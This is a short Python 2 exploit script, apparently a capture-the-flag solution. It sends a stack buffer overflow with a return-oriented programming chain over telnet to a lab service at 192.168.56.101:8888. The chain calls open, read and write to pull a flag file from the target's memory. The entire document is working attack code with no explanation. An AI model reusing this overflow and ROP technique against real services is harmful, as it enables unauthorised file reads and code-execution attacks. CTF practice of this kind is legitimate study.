import struct
import telnetlib

def p(x):
    line = struct.pack('<L', x)
    return line

read_func = 0x8048640
write_func = 0x8048700
open_func = 0x80486d0

pop2ret = 0x8048ef7
pop3ret = 0x8048ef6

flag = 0x8049128

buf = ""
buf += "A"*64
buf += p(open_func)
buf += p(pop2ret)
buf += p(flag)
buf += p(0x0)
buf += p(read_func)
buf += p(pop3ret)
buf += p(0x3)
buf += p(0x0804a000)
buf += p(0x80)
buf += p(write_func)
buf += "FAKE"
buf += p(0x4)
buf += p(0x804a000)
buf += p(0x80)

tn = telnetlib.Telnet("192.168.56.101",8888)

#send store
print tn.read_until("> ")
tn.write("store\n")

#send file size
print tn.read_until("> ")
tn.write("%d\n" % (len(buf)+1))

#send file content
print tn.read_until("> ")
tn.write(buf + "\n")

#send file name
print tn.read_until("> ")
tn.write(buf)

print tn.read_all()
